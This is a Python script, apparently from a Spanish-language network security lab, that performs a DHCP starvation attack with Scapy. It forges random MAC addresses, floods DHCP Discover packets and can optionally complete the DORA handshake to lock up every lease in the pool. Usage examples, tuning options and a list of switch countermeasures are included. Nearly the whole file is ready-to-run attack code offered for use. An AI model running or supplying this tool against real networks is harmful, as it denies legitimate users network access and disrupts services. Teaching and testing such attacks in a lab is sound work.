#!/usr/bin/env python3
"""
=============================================================================
LABORATORIO DE SEGURIDAD EN REDES - SCRIPT 04
Ataque: DHCP Starvation (Agotamiento del Pool DHCP)
=============================================================================
DESCRIPCIÓN:
    Este script realiza un ataque de agotamiento de pool DHCP enviando
    una gran cantidad de solicitudes DHCP con MACs de origen falsas y
    aleatorias. Cada solicitud se presenta como un cliente diferente,
    haciendo que el servidor DHCP asigne IPs del pool hasta agotarlo.

    Una vez agotado el pool, los clientes legítimos no pueden obtener
    una dirección IP, causando una Denegación de Servicio efectiva.

CÓMO FUNCIONA:
    1. Se generan MACs aleatorias para cada solicitud.
    2. Se construye un DHCP Discover con cada MAC falsa.
    3. El servidor DHCP responde con un Offer (asignando una IP).
    4. (Opcional) Se envía DHCP Request para confirmar y "reservar" la IP.
    5. El proceso se repite hasta agotar el rango del pool.

REQUISITOS:
    - Python 3.8+
    - Scapy: pip install scapy
    - Permisos root
    - Acceso al segmento de red capa 2

USO:
    sudo python3 dhcp_starvation.py -i eth2 -c 254
    sudo python3 dhcp_starvation.py -i eth2 -c 500 --confirm --delay 0.1

PARÁMETROS:
    -i / --interface   : Interfaz de red
    -c / --count       : Número de solicitudes DHCP a enviar (default: 254)
    --confirm          : Enviar DHCP Request para confirmar asignación
    --delay            : Delay entre solicitudes (default: 0.05s)
    --timeout          : Timeout para esperar DHCP Offer (default: 2s)

CONTRA-MEDIDAS:
    - DHCP Snooping con rate limiting por puerto:
        ip dhcp snooping limit rate 15  (máximo 15 paquetes/s por puerto)
    - Port Security: limitar número de MACs por puerto
        switchport port-security maximum 5
        switchport port-security violation restrict
    - 802.1X: autenticación antes de acceder a la red
    - Monitoreo de logs DHCP para detectar agotamiento inusual
    - Reservas DHCP estáticas para dispositivos críticos
=============================================================================
"""

import argparse
import random
import sys
import time
from threading import Thread

try:
    from scapy.all import (
        Ether, IP, UDP, BOOTP, DHCP,
        sendp, srp, conf
    )
except ImportError:
    print("[!] Scapy no está instalado. Ejecutar: pip install scapy")
    sys.exit(1)

# ─── Colores ─────────────────────────────────────────────────────────────────
RED    = "\033[91m"
GREEN  = "\033[92m"
YELLOW = "\033[93m"
CYAN   = "\033[96m"
RESET  = "\033[0m"
BOLD   = "\033[1m"

def banner():
    print(f"""
{RED}{BOLD}
╔══════════════════════════════════════════════════════════════╗
║      DHCP STARVATION ATTACK - LABORATORIO DE SEGURIDAD       ║
║               ¡SOLO PARA USO EDUCATIVO Y AUTORIZADO!         ║
╚══════════════════════════════════════════════════════════════╝
{RESET}""")

def random_mac() -> str:
    """
    Genera una MAC aleatoria con un OUI de Cisco para mayor realismo.
    Formato: XX:XX:XX:XX:XX:XX
    """
    # OUIs comunes para hacer el tráfico más creíble
    common_ouis = [
        [0x00, 0x0C, 0x29],  # VMware
        [0x08, 0x00, 0x27],  # VirtualBox
        [0x00, 0x50, 0x56],  # VMware ESX
        [0x52, 0x54, 0x00],  # QEMU/KVM
    ]
    oui = random.choice(common_ouis)
    mac_bytes = oui + [random.randint(0x00, 0xFF) for _ in range(3)]
    return ':'.join([f'{b:02x}' for b in mac_bytes])

def mac_to_bytes(mac: str) -> bytes:
    """Convierte MAC string a bytes (formato BOOTP chaddr)."""
    return bytes.fromhex(mac.replace(':', '')) + b'\x00' * 10  # Padding a 16 bytes

def build_discover(fake_mac: str) -> bytes:
    """
    Construye un paquete DHCP Discover con la MAC falsa proporcionada.
    
    El campo chaddr del BOOTP se rellena con la MAC falsa.
    El hostname es aleatorio para simular diferentes clientes.
    
    Args:
        fake_mac: Dirección MAC falsa a usar como origen
    Returns:
        Paquete Scapy listo para enviar
    """
    xid = random.randint(1, 0xFFFFFFFF)
    hostname = f"CLIENT-{random.randint(1000, 9999)}"

    pkt = (
        Ether(src=fake_mac, dst="ff:ff:ff:ff:ff:ff") /
        IP(src="0.0.0.0", dst="255.255.255.255") /
        UDP(sport=68, dport=67) /
        BOOTP(
            op=1,               # Boot Request
            chaddr=mac_to_bytes(fake_mac),
            xid=xid,
            flags=0x8000        # Broadcast flag
        ) /
        DHCP(options=[
            ("message-type", "discover"),
            ("hostname", hostname),
            ("param_req_list", [1, 3, 6, 15, 28, 51]),  # Solicitar: máscara, gw, dns, etc.
            "end"
        ])
    )
    return pkt

def build_request(fake_mac: str, offered_ip: str, server_ip: str, xid: int) -> bytes:
    """
    Construye un DHCP Request para confirmar una IP ofrecida.
    
    Esto completa el handshake DORA (Discover-Offer-Request-ACK)
    y "bloquea" definitivamente la IP en el servidor.
    """
    pkt = (
        Ether(src=fake_mac, dst="ff:ff:ff:ff:ff:ff") /
        IP(src="0.0.0.0", dst="255.255.255.255") /
        UDP(sport=68, dport=67) /
        BOOTP(
            op=1,
            chaddr=mac_to_bytes(fake_mac),
            xid=xid,
            flags=0x8000
        ) /
        DHCP(options=[
            ("message-type", "request"),
            ("server_id", server_ip),
            ("requested_addr", offered_ip),
            "end"
        ])
    )
    return pkt

def send_and_confirm(fake_mac: str, interface: str, timeout: float) -> bool:
    """
    Envía DHCP Discover y espera Offer para luego enviar Request.
    
    Implementa el handshake DORA completo para confirmar el agotamiento.
    
    Returns:
        True si se confirmó una asignación, False si no hubo respuesta
    """
    pkt = build_discover(fake_mac)
    answered, _ = srp(pkt, iface=interface, timeout=timeout, verbose=False)

    if not answered:
        return False

    for _, response in answered:
        if response.haslayer(DHCP):
            for opt in response[DHCP].options:
                if opt[0] == 'message-type' and opt[1] == 2:  # OFFER
                    offered_ip = response[BOOTP].yiaddr
                    server_ip  = response[BOOTP].siaddr
                    xid        = response[BOOTP].xid
                    req = build_request(fake_mac, offered_ip, server_ip, xid)
                    sendp(req, iface=interface, verbose=False)
                    return True
    return False

def dhcp_starvation(interface: str, count: int, confirm: bool,
                    delay: float, timeout: float):
    """
    Función principal del ataque DHCP Starvation.
    
    Args:
        interface : Interfaz de red
        count     : Número de solicitudes a enviar
        confirm   : Si True, completa el handshake DORA
        delay     : Tiempo entre solicitudes
        timeout   : Timeout para esperar DHCP Offers
    """
    print(f"{CYAN}[*] Iniciando DHCP Starvation en {interface}{RESET}")
    print(f"{CYAN}[*] Solicitudes: {count} | Confirmar: {confirm} | Delay: {delay}s{RESET}\n")

    sent      = 0
    confirmed = 0
    failed    = 0
    start     = time.time()

    for i in range(count):
        fake_mac = random_mac()

        try:
            if confirm:
                # Modo completo: esperar Offer y confirmar con Request
                success = send_and_confirm(fake_mac, interface, timeout)
                if success:
                    confirmed += 1
                    print(f"{GREEN}[+] {i+1:04d}/{count} | MAC: {fake_mac} | IP ASIGNADA y CONFIRMADA{RESET}")
                else:
                    failed += 1
                    print(f"{YELLOW}[~] {i+1:04d}/{count} | MAC: {fake_mac} | Sin respuesta{RESET}")
            else:
                # Modo rápido: solo enviar Discover sin esperar respuesta
                pkt = build_discover(fake_mac)
                sendp(pkt, iface=interface, verbose=False)
                sent += 1
                if i % 20 == 0:
                    elapsed = time.time() - start
                    rate = sent / elapsed if elapsed > 0 else 0
                    print(f"{YELLOW}[~] {sent}/{count} Discovers enviados | {rate:.1f} pkt/s{RESET}")

            time.sleep(delay)

        except KeyboardInterrupt:
            print(f"\n{YELLOW}[!] Ataque interrumpido.{RESET}")
            break

    elapsed = time.time() - start
    print(f"\n{GREEN}{BOLD}[✓] Ataque DHCP Starvation completado:{RESET}")
    print(f"    Solicitudes enviadas  : {sent + confirmed + failed}")
    if confirm:
        print(f"    IPs confirmadas (bloq): {confirmed}")
        print(f"    Sin respuesta         : {failed}")
    print(f"    Tiempo total          : {elapsed:.2f}s")

def main():
    banner()
    parser = argparse.ArgumentParser(
        description="DHCP Starvation - Laboratorio de Seguridad en Redes"
    )
    parser.add_argument("-i", "--interface", required=True)
    parser.add_argument("-c", "--count", type=int, default=254,
                        help="Número de solicitudes DHCP (default: 254)")
    parser.add_argument("--confirm", action="store_true",
                        help="Completar handshake DORA para confirmar asignación")
    parser.add_argument("--delay", type=float, default=0.05,
                        help="Delay entre solicitudes en segundos (default: 0.05)")
    parser.add_argument("--timeout", type=float, default=2.0,
                        help="Timeout esperando DHCP Offer (default: 2.0s)")

    args = parser.parse_args()
    dhcp_starvation(args.interface, args.count, args.confirm,
                    args.delay, args.timeout)

if __name__ == "__main__":
    main()
